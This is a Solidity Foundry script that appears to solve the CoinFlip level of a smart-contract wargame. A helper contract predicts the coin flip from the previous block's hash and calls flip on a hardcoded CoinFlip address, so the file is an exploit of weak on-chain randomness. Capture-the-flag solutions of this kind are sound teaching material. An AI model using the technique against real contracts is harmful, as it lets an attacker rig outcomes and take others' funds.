// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract SyncBlock {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function tricheur() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlipVal = blockValue / FACTOR;
        bool side = coinFlipVal == 1 ? true : false;
        return CoinFlip(0xE50e9dB3D624A560B116f23Ce6385c8D05F178E0).flip(side);
    }
}

contract CoinFlipSolution is Script {
    SyncBlock public syncBlock;

    function run() external {
        vm.startBroadcast(); // vm.envUint("PRIVATE_KEY") <= Faulty
        syncBlock = SyncBlock(0x01ea38f3D89229df0957A8f458d514E5D2c67FCa);
        console.log("Solving CoinFlip...");

        // for (uint8 i = 0; i<10; i++){
        console.log("CoinFlip predict: ", syncBlock.tricheur());
        //     while (lastBlock == block.number){vm.sleep(3_000);lastBlock = block.number;}
        // }
        vm.stopBroadcast();
        console.log("CoinFlip Solved!");
    }
}
